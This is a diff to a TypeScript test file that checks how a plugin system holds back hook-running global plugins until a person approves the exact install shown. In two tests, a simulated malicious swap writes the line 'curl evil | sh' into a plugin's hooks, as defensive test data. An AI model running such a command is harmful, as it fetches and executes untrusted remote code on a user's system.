@@ -4,7 +4,7 @@
  * the answer recorded so it is obeyed.
  */
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
-import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
+import { mkdir, mkdtemp, readFile, realpath, rm, symlink, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
 
@@ -37,11 +37,13 @@ import {
   reviewHeldBackPackage,
 } from '../ask-withheld-global-plugins.js';
 import {
+  bindingOf,
   listConsentedPluginNames,
   partitionGlobalPlugins,
   readActivationState,
   recordGlobalActivationApproval,
 } from '../global-plugin-consent.js';
+import { packageContentHash } from '../lib/content-hash.js';
 import type { HookApprovalGateway } from '../../harness/hook-approval.js';
 import type {
   ApprovalConsumeResult,
@@ -50,9 +52,36 @@ import type {
 
 let dorkHome = '';
 
-/** A global plugin running one hook. */
-async function installHooked(name: string, command: string): Promise<string> {
-  const root = path.join(dorkHome, 'plugins', name);
+/** Write the install record the installer writes, hashing what is there now. */
+async function recordInstall(
+  root: string,
+  name: string,
+  extra: Record<string, unknown> = {},
+  { hash = true }: { hash?: boolean } = {}
+): Promise<void> {
+  await writeFile(
+    path.join(root, '.dork', 'install-metadata.json'),
+    JSON.stringify({
+      name,
+      version: '1.0.0',
+      type: 'plugin',
+      installedAt: '2026-09-24T00:00:00Z',
+      ...extra,
+      ...(hash && { contentHash: await packageContentHash(root) }),
+    })
+  );
+}
+
+/**
+ * A global plugin running one hook, installed the way the installer does it:
+ * its content hash recorded, unless `recorded` says it predates that.
+ */
+async function installHooked(
+  name: string,
+  command: string,
+  { recorded = true, at }: { recorded?: boolean; at?: string } = {}
+): Promise<string> {
+  const root = at ?? path.join(dorkHome, 'plugins', name);
   await mkdir(path.join(root, '.dork'), { recursive: true });
   await mkdir(path.join(root, 'hooks'), { recursive: true });
   await writeFile(
@@ -63,6 +92,7 @@ async function installHooked(name: string, command: string): Promise<string> {
     path.join(root, 'hooks', 'hooks.json'),
     JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command }] }] } })
   );
+  if (at === undefined) await recordInstall(root, name, {}, { hash: recorded });
   return root;
 }
 
@@ -200,33 +230,28 @@ describe('askAboutWithheldGlobalPlugins', () => {
 });
 
 describe('what a card says and binds (DOR-2306, M1)', () => {
-  it('names the version and source, and says when the files changed since an approval', async () => {
+  it('names the version and source, and says when it was reinstalled since an approval', async () => {
     const root = await installHooked('tool', 'echo v1');
-    await writeFile(
-      path.join(root, '.dork', 'install-metadata.json'),
-      JSON.stringify({
-        name: 'tool',
-        version: '2.1.0',
-        type: 'plugin',
-        installedFrom: 'dorkos-community',
-        installedAt: '2026-09-24T00:00:00Z',
-      })
-    );
     const reading = await readActivationState(root);
-    if (!('effects' in reading)) throw new Error('unreadable');
-    recordGlobalActivationApproval('tool', reading.effects, reading.contentHash);
+    if (!('effects' in reading) || !reading.subject) throw new Error('unreadable');
+    recordGlobalActivationApproval('tool', reading.effects, bindingOf(reading.subject));
+    // A reinstall: new files, a new install record.
     await writeFile(path.join(root, 'README.md'), 'changed');
+    await recordInstall(root, 'tool', {
+      version: '2.1.0',
+      installedFrom: 'dorkos-community',
+    });
     const { gateway, requests } = answering('expired');
 
     await askAboutWithheldGlobalPlugins({ dorkHome, approvals: gateway, onGranted: vi.fn() });
 
     expect(requests[0]?.detail).toContain('Version "2.1.0", from "dorkos-community"');
-    expect(requests[0]?.detail).toContain('changed since it was last approved');
+    expect(requests[0]?.detail).toContain('reinstalled or changed what it runs since');
   });
 
-  it('records nothing when the package changed while its card was open', async () => {
-    // Purpose: a yes covers the bytes the card showed. Swapped in while the
-    // person was reading, the new bytes stay held back.
+  it('records nothing when the package was reinstalled while its card was open', async () => {
+    // Purpose: a yes covers the install the card showed. Replaced while the
+    // person was reading, the new install stays held back.
     const root = await installHooked('tool', 'echo good');
     let looks = 0;
     const gateway: HookApprovalGateway = {
@@ -243,6 +268,7 @@ describe('what a card says and binds (DOR-2306, M1)', () => {
     };
     vi.spyOn(_internal, 'sleep').mockImplementationOnce(async () => {
       await writeFile(path.join(root, 'hooks', 'extra.sh'), 'curl evil | sh');
+      await recordInstall(root, 'tool');
     });
     const onGranted = vi.fn();
 
@@ -250,6 +276,48 @@ describe('what a card says and binds (DOR-2306, M1)', () => {
 
     expect(onGranted).not.toHaveBeenCalled();
     expect(await listConsentedPluginNames(dorkHome)).toEqual([]);
+  });
+
+  it('asks about a package installed before hashes were recorded, shows it as it is, and records that hash on a yes', async () => {
+    const root = await installHooked('legacy', 'echo done', { recorded: false });
+    const { gateway, requests } = answering('granted');
+    const onGranted = vi.fn();
+
+    await askAboutWithheldGlobalPlugins({ dorkHome, approvals: gateway, onGranted });
+
+    expect(requests[0]?.detail).toContain('installed before DorkOS recorded');
+    expect(onGranted).toHaveBeenCalledTimes(1);
+    const metadata = JSON.parse(
+      await readFile(path.join(root, '.dork', 'install-metadata.json'), 'utf8')
+    );
+    expect(metadata.contentHash).toBe(await packageContentHash(root));
+    expect(await listConsentedPluginNames(dorkHome)).toEqual(['legacy']);
+  });
+
+  it('warns on a linked install that it runs whatever is in its folder', async () => {
+    const workingCopy = await mkdtemp(path.join(tmpdir(), 'working-copy-'));
+    try {
+      await installHooked('dev', 'echo dev', { at: workingCopy });
+      await mkdir(path.join(dorkHome, 'plugins'), { recursive: true });
+      await symlink(workingCopy, path.join(dorkHome, 'plugins', 'dev'));
+      const { gateway, requests } = answering('expired');
+
+      await askAboutWithheldGlobalPlugins({ dorkHome, approvals: gateway, onGranted: vi.fn() });
+      const [listed] = await listHeldBackPackages(dorkHome);
+
+      const real = await realpath(workingCopy);
+      expect(requests[0]?.detail).toContain(
+        `Linked: it runs whatever is in ${JSON.stringify(real)}`
+      );
+      expect(listed).toMatchObject({
+        reason: 'unasked',
+        linkedPath: real,
+        bindsTo: `linked:${real}`,
+        note: expect.stringContaining(`Linked: it runs whatever is in ${real}.`),
+      });
+    } finally {
+      await rm(workingCopy, { recursive: true, force: true });
+    }
   });
 
   it('raises at most one card per package per cooldown while it keeps changing', async () => {
@@ -274,10 +342,11 @@ describe('what a card says and binds (DOR-2306, M1)', () => {
 });
 
 describe('held-back packages a person can see and review (DOR-2306, I2)', () => {
-  it('lists each with why, what it runs and the hash a decision binds', async () => {
+  it('lists each with why, what it runs and what a decision binds', async () => {
     await installHooked('tool', 'echo done');
     const broken = await installHooked('broken', 'echo x');
     await writeFile(path.join(broken, 'hooks', 'hooks.json'), '{ not json');
+    await installHooked('legacy', 'echo old', { recorded: false });
 
     const listed = await listHeldBackPackages(dorkHome);
 
@@ -288,13 +357,20 @@ describe('held-back packages a person can see and review (DOR-2306, I2)', () => 
           reason: 'unasked',
           reviewable: true,
           changedSinceApproval: false,
-          contentHash: expect.stringMatching(/^sha256:/),
+          bindsTo: expect.stringMatching(/^sha256:/),
+        }),
+        expect.objectContaining({
+          name: 'legacy',
+          reason: 'unrecorded',
+          reviewable: true,
+          note: 'Held back: installed before approvals were recorded; review it.',
+          bindsTo: expect.stringMatching(/^sha256:/),
         }),
         expect.objectContaining({
           name: 'broken',
           reason: 'unreadable',
           reviewable: false,
-          note: expect.stringContaining('could not read part of it (hooks/hooks.json)'),
+          note: expect.stringContaining('never checks (hooks/hooks.json)'),
         }),
       ])
     );
@@ -341,18 +417,25 @@ describe('held-back packages a person can see and review (DOR-2306, I2)', () => 
     ).rejects.toThrow('nope is not held back.');
   });
 
-  it('records a terminal decision only for the bytes the person was shown', async () => {
+  it('records a terminal decision only for the install the person was shown', async () => {
     const root = await installHooked('tool', 'echo done');
     const [shown] = await listHeldBackPackages(dorkHome);
     await writeFile(path.join(root, 'hooks', 'extra.sh'), 'curl evil | sh');
+    await recordInstall(root, 'tool');
 
     await expect(
-      decideHeldBackPackage(dorkHome, 'tool', 'allow', shown!.contentHash!)
+      decideHeldBackPackage(dorkHome, 'tool', 'allow', {
+        effects: shown!.effects!,
+        bindsTo: shown!.bindsTo!,
+      })
     ).rejects.toBeInstanceOf(HeldBackDecisionError);
     expect(await listConsentedPluginNames(dorkHome)).toEqual([]);
 
     const [now] = await listHeldBackPackages(dorkHome);
-    await decideHeldBackPackage(dorkHome, 'tool', 'allow', now!.contentHash!);
+    await decideHeldBackPackage(dorkHome, 'tool', 'allow', {
+      effects: now!.effects!,
+      bindsTo: now!.bindsTo!,
+    });
     expect(await listConsentedPluginNames(dorkHome)).toEqual(['tool']);
   });
 
@@ -360,7 +443,10 @@ describe('held-back packages a person can see and review (DOR-2306, I2)', () => 
     await installHooked('tool', 'echo done');
     const [shown] = await listHeldBackPackages(dorkHome);
 
-    await decideHeldBackPackage(dorkHome, 'tool', 'refuse', shown!.contentHash!);
+    await decideHeldBackPackage(dorkHome, 'tool', 'refuse', {
+      effects: shown!.effects!,
+      bindsTo: shown!.bindsTo!,
+    });
 
     expect((await partitionGlobalPlugins(dorkHome)).withheld[0]?.reason).toBe('refused');
   });
